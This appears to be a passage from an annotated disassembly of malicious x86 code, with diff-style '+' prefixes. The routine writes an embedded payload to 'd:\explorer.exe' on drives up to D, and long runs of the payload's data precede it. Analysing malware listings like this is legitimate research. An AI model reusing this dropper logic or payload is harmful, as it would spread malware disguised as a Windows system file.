+seg000:00000DD9	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DDD	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DE1	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DE5	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DE9	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DED	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DF1	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DF5	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DF9	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000DFD	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E01	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E05	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E09	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E0D	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E11	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E15	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E19	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E1D	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E21	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E25	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E29	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E2D	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E31	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E35	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E39	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E3D	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E41	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E45	FC FC FC FC			  dd 0FCFCFCFCh
+seg000:00000E49	FC FC FC 00			  dd 0FCFCFCh
+seg000:00000E4D	00 00 00 00			  dd 0
+seg000:00000E51	00 00 00 00			  dd 0
+seg000:00000E55	00 00 00 00			  dd 0
+seg000:00000E59	00 00 00 00			  dd 0
+seg000:00000E5D	00 00 00 00			  dd 0
+seg000:00000E61			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000E61			  
+seg000:00000E61			  CREATE_EXPLORER:			  ; CODE XREF: sub_1C4+6DEp
+seg000:00000E61	5E				  pop	  esi		  ; set	esi to the beginning of	the file to write
+seg000:00000E62	BF B9 05 00 00			  mov	  edi, 5B9h
+seg000:00000E67	6A 07				  push	  7
+seg000:00000E69	E8 10 00 00 00			  call	  loc_E7E	  ; Call Procedure
+seg000:00000E69			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000E6E	64 3A 5C 65 78 70+aDExplorer_exe  db 'd:\explorer.exe',0
+seg000:00000E7E			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000E7E			  
+seg000:00000E7E			  loc_E7E:				  ; CODE XREF: sub_1C4+CA5p
+seg000:00000E7E	8B 04 24			  mov	  eax, [esp]
+seg000:00000E81	88 18				  mov	  [eax], bl
+seg000:00000E83	FF 55 CC			  call	  dword	ptr [ebp-34h] ;	Indirect Call Near Procedure
+seg000:00000E86	83 F8 FF			  cmp	  eax, 0FFFFFFFFh ; Compare Two	Operands
+seg000:00000E89	74 4D				  jz	  short	LETTER_LOOP ; Jump if Zero (ZF=1)
+seg000:00000E8B	89 85 4C FE FF FF		  mov	  [ebp-1B4h], eax
+seg000:00000E91	AC				  lodsb			  ; Load String
+seg000:00000E92	8A F8				  mov	  bh, al	  ; set	bh to 0xFC
+seg000:00000E94			  
+seg000:00000E94			  WRITE_TOP:				  ; CODE XREF: sub_1C4+D09j
+seg000:00000E94	38 3E				  cmp	  [esi], bh	  ; check if edi pointer is the	same as	*esi
+seg000:00000E96	75 27				  jnz	  short	WRITE_BYTE ; if	it isn't, then go here
+seg000:00000E98	6A 20				  push	  20h ;	' '
+seg000:00000E9A	E8 23 00 00 00			  call	  WRITE_EXP	  ; Call Procedure
+seg000:00000E9A			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000E9F	00 00 00 00			  dd 0			  ; 20h	bytes
+seg000:00000EA3	00 00 00 00			  dd 0
+seg000:00000EA7	00 00 00 00			  dd 0
+seg000:00000EAB	00 00 00 00			  dd 0
+seg000:00000EAF	00 00 00 00			  dd 0
+seg000:00000EB3	00 00 00 00			  dd 0
+seg000:00000EB7	00 00 00 00			  dd 0
+seg000:00000EBB	00 00 00 00			  dd 0
+seg000:00000EBF			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000EBF			  
+seg000:00000EBF			  WRITE_BYTE:				  ; CODE XREF: sub_1C4+CD2j
+seg000:00000EBF	6A 01				  push	  1
+seg000:00000EC1	56				  push	  esi
+seg000:00000EC2			  
+seg000:00000EC2			  WRITE_EXP:				  ; CODE XREF: sub_1C4+CD6p
+seg000:00000EC2	FF B5 4C FE FF FF		  push	  [ebp+H_FILE]	  ; used for d:\explorer.exe
+seg000:00000EC8	FF 55 C8			  call	  [ebp+_lwrite]	  ; Indirect Call Near Procedure
+seg000:00000ECB	46				  inc	  esi		  ; Increment by 1
+seg000:00000ECC	4F				  dec	  edi		  ; Decrement by 1
+seg000:00000ECD	75 C5				  jnz	  short	WRITE_TOP ; check if edi pointer is the	same as	*esi
+seg000:00000ECF	FF B5 4C FE FF FF		  push	  [ebp+H_FILE]	  ; used for d:\explorer.exe
+seg000:00000ED5	FF 55 C4			  call	  [ebp+_lclose]	  ; Indirect Call Near Procedure
+seg000:00000ED8			  
+seg000:00000ED8			  LETTER_LOOP:				  ; CODE XREF: sub_1C4+CC5j
+seg000:00000ED8	FE C3				  inc	  bl		  ; Increment by 1
+seg000:00000EDA	80 FB 64			  cmp	  bl, 64h ; 'd'   ; do this again for d
+seg000:00000EDD	0F 86 4C F9 FF FF		  jbe	  CREATEFILES_TOP ; Jump if Below or Equal (CF=1 | ZF=1)
+seg000:00000EE3	C3				  retn			  ; Return Near	from Procedure
+seg000:00000EE4			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000EE4	61				  popa			  ; Pop	all General Registers
+seg000:00000EE5	C9				  leave			  ; High Level Procedure Exit
+seg000:00000EE6	C2 04 00			  retn	  4		  ; Return Near	from Procedure
+seg000:00000EE6			  sub_1C4	  endp ; sp = -64h
+seg000:00000EE6			  
+seg000:00000EE6			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000EE9	90				  db  90h ; 
+seg000:00000EE9			  seg000	  ends
+seg000:00000EE9			  
+seg000:00000EE9			  
+seg000:00000EE9					  end 
